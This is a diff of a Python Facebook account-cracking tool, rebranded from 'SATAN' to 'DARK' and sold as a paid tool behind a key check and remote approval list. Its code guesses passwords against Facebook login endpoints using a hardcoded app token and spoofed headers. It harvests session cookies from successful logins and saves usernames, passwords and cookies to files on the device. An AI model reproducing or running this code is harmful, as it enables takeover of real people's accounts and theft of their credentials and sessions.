@@ -1,4 +1,4 @@
-#SC OWNER_______________SATAN
+#SC OWNER_______________DARK
 
 from ast import Pass
 from os import name, path
@@ -117,20 +117,21 @@ def clear():
 	os.system('clear')
 	print(logo)
 logo=("""\033[1;37m
- .d8888.  .d8b.  d888888b  .d8b.  d8b   db 
- 88'  YP d8' `8b `~~88~~' d8' `8b 888o  88 
- `8bo.   88ooo88    88    88ooo88 88V8o 88 
-\033[92;1m   `Y8b. 88~~~88    88    88~~~88 88 V8o88 
- db   8D 88   88    88    88   88 88  V888 
- `8888Y' YP   YP    YP    YP   YP VP   V8P         
-         \033[1;37m[\033[92;1mSATAN \033[92;1mNAAM \033[92;1mTU \033[92;1mSUNA \033[92;1mHOGA\033[1;37m]
+██████╗░░█████╗░██████╗░██╗░░██╗
+██╔══██╗██╔══██╗██╔══██╗██║░██╔╝
+██║░░██║███████║██████╔╝█████═╝░
+██║░░██║██╔══██║██╔══██╗██╔═██╗░
+██████╔╝██║░░██║██║░░██║██║░╚██╗
+╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝
+         \033[1;37m[\033[92;1mDARK \033[92;1mNAAM \033[92;1mTU \033[92;1mSUNA \033[92;1mHOGA\033[1;37m]
 \033[1;37m-----------------------------------------------
-\033[1;37m AUTHOR    : SATAN \033[92;1m•
-\033[1;37m GITHUB    : NOT FOUND
-\033[1;37m VERSION   : \033[92;1m3\033[92;1m.\033[92;1m4 
+FACEBOOK : DARK OLMAR/PRIMO SOLTERO
+GITHUB : NOT FOUND
+TYPE OF TOOL : PAID
+VERSION : 0.1
 \033[1;37m═══════════════════════════════════════════════
 \033[92;1m            WELCOME TO SATAN TOOL         
-\033[92;1m                 FREE TRAIL \033[1;37m√ 
+\033[92;1m                 PAID TOOL \033[1;37m√ 
 \033[1;37m═══════════════════════════════════════════════""")   
 
 def line():
@@ -173,12 +174,12 @@ def asha(uid):
     else:alif=''
     return alif
 #_________[ LOGIN KEY ]______>>
-CorrectUsername = 'SATAN'
+CorrectUsername = 'dark'
 key = 'true'
 while key == 'true':
-    username = input('\033[0;97m[•]\033[1;96m•────➤\033[1;92mENTER KEY \033[1;91m: \x1b[1;92m')
+    username = input('\033[0;97m[dark]\033[1;96m•────➤\033[1;92mDARK PASSKEY \033[1;91m: \x1b[1;92m')
     if username == CorrectUsername:
-            print(f'\033[1;37m-----------------------------------------------\n\033[0;97m[•]\033[1;32m LOGGED IN SATAN TOOL SUCCESSFULLY') 
+            print(f'\033[1;37m-----------------------------------------------\n\033[0;97m[•]\033[1;32m YOU LOGGED IN SUCCESSFULLY') 
             time.sleep(1)
             clear()
             key = 'false'
@@ -228,7 +229,7 @@ def menu():
                                         plist.append(input(f' PUT PASSWORD {i+1}: '))
                                 line()
                                 clear()
-                                #print(' DO YOU WENT SHOW COOKIES :? (Y/N): ')
+                                #print(' DO YOU WANT TO SHOW COOKIES :? (Y/N): ')
                                 #line()
                                 #cx=input(' CHOOSE : ')
                                 #if cx in ['y','Y','yes','Yes','1']:
@@ -468,7 +469,7 @@ def gmail():
 
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSATAN\x1b[1;92m-\x1b[1;92mM3\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mDARK\x1b[1;92m-\x1b[1;92mM3\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -489,15 +490,15 @@ def ffb(ids,names,passlist):
                         if "c_user" in Aws:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print('\r\r\033[1;32m [SATAN-OK] %s | %s'%(ids,pas))
-                                open('/sdcard/SATAN-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/SATAN-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
+                                print('\r\r\033[1;32m [DARK-ALIVE] %s | %s'%(ids,pas))
+                                open('/sdcard/DARK-ALIVE.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/DARK-ALIVE-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                               
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Aws:
                                 if 'y' in pcp:
-                                        #print('\r\r\x1b[38;5;208m [SATAN-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/SATAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        #print('\r\r\x1b[38;5;208m [DARK-DEAD] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/DARK-DEAD.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -510,7 +511,7 @@ def ffb(ids,names,passlist):
 def api1(ids,names,passlist):
 	try:
 		global ok,loop,sim_id
-		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSATAN\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
+		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mDARK\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
 		fn = names.split(' ')[0]
 		try:
 			ln = names.split(' ')[1]
@@ -523,18 +524,18 @@ def api1(ids,names,passlist):
 			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
 			if 'session_key' in po:
 				uid = str(po['uid'])
-				print('\r\r\033[1;32m [SATAN-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
+				print('\r\r\033[1;32m [DARK-ALIVE] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
 				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
 				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
 				cookies = f"sb={ssbb};{ckkk}"
 				#print('\033[1;37m [🍪] Cookies :- '+cookies)
-				open('/sdcard/SATAN-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
+				open('/sdcard/DARK-ALIVE.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
 				oks.append(uid)
 				break
 			elif 'www.facebook.com' in po['error']['message']:
 				uid = str(po['error']['error_data']['uid'])
-				#print(f'\r\r\033[1;33m [SATAN-CP] '+uid+' | '+pas+'\033[1;97m')
-				open('/sdcard/SATAN-CP.txt','a').write(uid+'|'+pas+'\n')
+				#print(f'\r\r\033[1;33m [DARK-DEAD] '+uid+' | '+pas+'\033[1;97m')
+				open('/sdcard/DARK-DEAD.txt','a').write(uid+'|'+pas+'\n')
 				cps.append(uid)
 				break
 			else:
@@ -548,7 +549,7 @@ def rd(ids,passlist):
 	try:
 		global oks,loop
                 
-		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSATAN\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()		
+		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mDARK\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()		
 		for pas in passlist:                                          
 			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'			
 			head = {'User-Agent':S1(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
@@ -556,19 +557,19 @@ def rd(ids,passlist):
 			po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
 			if 'session_key' in po:
 				uid = str(po['uid'])                                  
-				print('\r\r\033[1;32m [SATAN-OK] '+uid+' | '+pas+' | '+asha(uid)+'\033[1;32m')                                                                                          
+				print('\r\r\033[1;32m [DARK-ALIVE] '+uid+' | '+pas+' | '+asha(uid)+'\033[1;32m')                                                                                          
 				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
 				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
 				cookies = f"sb={ssbb};{ckkk}"
 				print('\033[1;37m [🍪] Cookies :- '+cookies)                                                                                                                                                
-				open('/sdcard/SATAN-R-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
+				open('/sdcard/DARK-R-ALIVE.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
 				oks.append(uid)
                                 
 				break
 			elif 'www.facebook.com' in po['error']['message']:                                
 				uid = str(po['error']['error_data']['uid'])
-				#print(f'\r\r\033[1;33m [SATAN-CP] '+uid+' | '+pas+'\033[1;97m')
-				open('/sdcard/SATAN-R-CP.txt','a').write(uid+'|'+pas+'\n')
+				#print(f'\r\r\033[1;33m [DARK-DEAD] '+uid+' | '+pas+'\033[1;97m')
+				open('/sdcard/DARK-R-DEAD.txt','a').write(uid+'|'+pas+'\n')
 				cps.append(uid)
 				break
 			else:
@@ -585,7 +586,7 @@ def bd1(ids,passlist):
     try:
         for ps in passlist:            
             session = requests.Session()
-            sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSATAN\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	            
+            sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mDARK\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	            
             pro = random.choice(S1())            
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
@@ -635,19 +636,19 @@ def bd1(ids,passlist):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m [SATAN-OK] '+ids+' | '+ps)                
+                print('\r\r\033[1;32m [DARK-ALIVE] '+ids+' | '+ps)                
                 print('\033[1;37m [🍪] Cookies :- '+coki)                
-                open('/sdcard/SATAN-BD-OK.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
+                open('/sdcard/DARK-BD-ALIVE.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print(f'\r\r\033[1;33m [SATAN-CP] '+ids+' | '+ps+'\033[1;97m')
-                open('/sdcard/SATAN-BD-CP.txt', 'a').write( ids+' | '+ps+' \n')
+                #print(f'\r\r\033[1;33m [DAKR-DEAD] '+ids+' | '+ps+'\033[1;97m')
+                open('/sdcard/DARK-BD-DEAD.txt', 'a').write( ids+' | '+ps+' \n')
                 cps.append(cid)
             elif twf in session.cookies.get_dict().keys():
-                print('\033[1;93m\033[0;34mSATAN-2F '+ids+' • '+ps+'  \033[0;97m')
+                print('\033[1;93m\033[0;34mDARK-2F '+ids+' • '+ps+'  \033[0;97m')
                 break
             else:
                 continue
@@ -662,7 +663,7 @@ def bd1(ids,passlist):
 def newidx(ids,names,passlist):
 	try:
 		global ok,loop,sim_id
-		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSATAN\x1b[1;92m-\x1b[1;92mM2\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
+		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mDARK\x1b[1;92m-\x1b[1;92mM2\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
 		fn = names.split(' ')[0]
 		try:
 			ln = names.split(' ')[1]
@@ -680,13 +681,13 @@ def newidx(ids,names,passlist):
 				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
 				cookies = f"sb={ssbb};{ckkk}"
 				#print('\033[1;37m [🍪] Cookies :- '+cookies)
-				open('/sdcard/SATAN-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
+				open('/sdcard/DARK-ALIVE.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
 				oks.append(uid)
 				break
 			elif 'www.facebook.com' in po['error']['message']:
 				uid = str(po['error']['error_data']['uid'])
-				#print(f'\r\r\033[1;33m [SATAN-CP] '+uid+' | '+pas+'\033[1;97m')
-				open('/sdcard/SATAN-CP.txt','a').write(uid+'|'+pas+'\n')
+				#print(f'\r\r\033[1;33m [DARK-DEAD] '+uid+' | '+pas+'\033[1;97m')
+				open('/sdcard/DARK-DEAD.txt','a').write(uid+'|'+pas+'\n')
 				cps.append(uid)
 				break
 			else:
@@ -697,8 +698,8 @@ def newidx(ids,names,passlist):
 	except Exception as e:
 		pass
 def approval():
-	frist="FUCK["
-	last="]YOU"
+	frist="DARK["
+	last="]KEY"
 	uuid=str(os.getuid()) + str(os.getlogin())
 	key = "6".join(uuid)
 	a=requests.get("https://github.com/vionepogi/approval/blob/main/approval.txt").text
@@ -708,7 +709,7 @@ def approval():
 		print("YOUR KEY IS NOT APPROVED")
 		os.system("clear")
 		print(logo)
-		print("TOOL IS FREE BUT NEED PERMISSION ")
+		print("THIS TOOL IS PAID NEED APPROVAL FIRST ")
 		print("PLEASE CONTACT TO ADMIN")
 		os.system('espeak -a 300 " For approved contact admin"')
 		print("Your key : "+frist+key+last)	
